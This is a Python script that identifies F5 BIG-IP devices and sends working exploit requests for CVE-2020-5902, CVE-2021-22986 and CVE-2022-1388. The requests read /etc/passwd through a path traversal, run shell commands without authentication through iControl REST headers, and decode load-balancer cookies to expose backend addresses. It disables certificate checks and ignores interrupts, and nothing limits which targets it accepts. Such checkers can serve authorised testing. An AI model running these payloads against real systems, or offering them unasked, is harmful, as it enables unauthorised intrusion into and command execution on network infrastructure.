#!/usr/bin/env python3
import urllib.request,urllib.error,json,sys,signal,ssl,socket,struct,re
signal.signal(signal.SIGINT,signal.SIG_IGN)
CTX=ssl.create_default_context();CTX.check_hostname=False;CTX.verify_mode=ssl.CERT_NONE
def fetch(url,method="GET",data=None,headers=None,t=12):
 hdrs={"User-Agent":"python-requests/2.28","Content-Type":"application/json"}
 if headers: hdrs.update(headers)
 try:
  req=urllib.request.Request(url,data=data,headers=hdrs,method=method)
  with urllib.request.urlopen(req,timeout=t,context=CTX) as r:
   return r.read().decode("utf-8",errors="replace"),r.getcode(),dict(r.headers)
 except urllib.error.HTTPError as e:
  try: body=e.read().decode("utf-8",errors="replace")
  except: body=""
  return body,e.code,dict(e.headers)
 except: return "",0,{}
def decode_bigip_cookie(cv):
 try:
  parts=cv.split(".")
  if len(parts)>=2:
   ip=socket.inet_ntoa(struct.pack("<I",int(parts[0])))
   port=socket.ntohs(int(parts[1]))
   return f"{ip}:{port}"
 except: pass
 return None
def check_5902(base):
 paths=["/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
        "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts"]
 for path in paths:
  body,code,_=fetch(f"{base}{path}")
  if code==200 and ("root:" in body or "localhost" in body):
   return "CVE-2020-5902:TMUI path traversal - file read confirmed"
 return None
def check_22986(base):
 body,code,_=fetch(f"{base}/mgmt/tm/util/bash",method="GET",headers={"X-F5-Auth-Token":"0"})
 if code==401:
  payload=json.dumps({"command":"run","utilCmdArgs":"-c id"}).encode()
  body3,code3,_=fetch(f"{base}/mgmt/tm/util/bash",method="POST",data=payload,
   headers={"X-F5-Auth-Token":"0","Authorization":"Basic YWRtaW46","Content-Type":"application/json"})
  if code3==200 and ("uid=" in body3 or "root" in body3):
   return "CVE-2021-22986:CONFIRMED RCE via iControl REST SSRF"
 return None
def check_1388(base):
 payload=json.dumps({"command":"run","utilCmdArgs":"-c id"}).encode()
 body,code,_=fetch(f"{base}/mgmt/tm/util/bash",method="POST",data=payload,
  headers={"X-F5-Auth-Token":"0","X-Forwarded-For":"127.0.0.1",
           "Connection":"keep-alive, X-F5-Auth-Token","Content-Type":"application/json"})
 if code==200 and ("uid=" in body or "root" in body):
  return "CVE-2022-1388:iControl auth bypass - RCE confirmed"
 body2,code2,_=fetch(f"{base}/mgmt/tm/ltm/",method="GET",
  headers={"X-F5-Auth-Token":"0","X-Forwarded-For":"127.0.0.1","Connection":"keep-alive, X-F5-Auth-Token"})
 if code2==200:
  return "CVE-2022-1388:iControl auth bypass confirmed (200 without creds)"
 return None
def check_cookie(ip,port):
 issues=[]
 for scheme in ("http","https"):
  body,code,hdrs=fetch(f"{scheme}://{ip}:{port}/",t=8)
  ch=hdrs.get("Set-Cookie","")
  bigip=re.findall(r"BIGipServer[^=]+=([^;]+)",ch)
  for cv in bigip:
   d=decode_bigip_cookie(cv.strip())
   if d:
    pool=re.search(r"BIGipServer([^=]+)=",ch)
    pn=pool.group(1) if pool else "unknown"
    issues.append(f"COOKIE_DISCLOSURE:Pool '{pn}' exposes backend {d}")
  if issues or code in (200,301,302,403): break
 return issues
def is_f5(ip,port):
 for scheme in ("https","http"):
  body,code,hdrs=fetch(f"{scheme}://{ip}:{port}/",t=8)
  if code>0 and any(k in (body+str(hdrs)).lower() for k in ["bigip","big-ip","tmui","icontrol","f5"]):
   return True
 return False
def check(ip,port):
 issues=[]
 ci=check_cookie(ip,port);issues.extend(ci)
 f5=is_f5(ip,port) or bool(ci)
 if not f5: return issues
 for base in (f"https://{ip}:{port}",f"http://{ip}:{port}"):
  r=check_5902(base)
  if r: issues.append(r);break
 for base in (f"https://{ip}:{port}",f"http://{ip}:{port}"):
  r=check_22986(base)
  if r: issues.append(r);break
 for base in (f"https://{ip}:{port}",f"http://{ip}:{port}"):
  r=check_1388(base)
  if r: issues.append(r);break
 return issues
if __name__=="__main__":
 if len(sys.argv)<3: sys.exit(1)
 r=check(sys.argv[1],sys.argv[2])
 for x in r: print(x)
 sys.exit(0 if r else 1)
